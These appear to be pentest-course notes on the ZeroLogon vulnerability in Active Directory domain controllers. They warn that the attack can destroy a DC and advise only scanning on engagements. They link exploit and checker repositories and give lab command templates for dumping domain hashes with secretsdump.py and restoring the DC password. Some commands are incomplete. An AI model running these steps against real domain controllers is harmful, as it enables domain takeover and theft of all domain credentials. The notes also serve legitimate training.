* This attack can easily destroy an AD DC so it should not be used on a pentest. Instead, scan for the vulnerability but do not actually run it.
* HA does show in the video how to run it and how to restore the DC
* The attack resets the DC password to null
* Helpful links suggested by HA:

* If you are running the attack (e.g. in a virtual environment lab) git clone from https://github.com/dirkjanm/CVE-2020-1472
* Also, make sure you have the latest version of impacket installed
* run SecuraBV ZeroLogon Checker - https://github.com/SecuraBV/CVE-2020-1472 to check if the DC is vulnerable (you can copy the raw code from the repository and paste it into a doc and run it with python3
syntax from repository:

"Given a domain controller named EXAMPLE-DC with IP address 1.2.3.4, run the script as follows:

$ ./zerologon_tester.py EXAMPLE-DC 1.2.3.4

The DC name should be its NetBIOS computer name. If this name is not correct, the script will likely fail with a STATUS_INVALID_COMPUTER_NAME error."
* If the DC is vulnerable, in a virtual lab environment run the ZeroLogon attack:
syntax:
$ secretsdump.py -just-dc <DOMAIN_NAME>/<DC_NAME>\&@<DC_IP_ADDRESS>
$ secretsdump.py administrator@<DC_IP_ADDRESS> -hashes
$ python3 restorepassword.py <DOMAIN_NAME>/<DC_NAME>@<DC_NAME> -target-ip <DC_IP_ADDRESS>
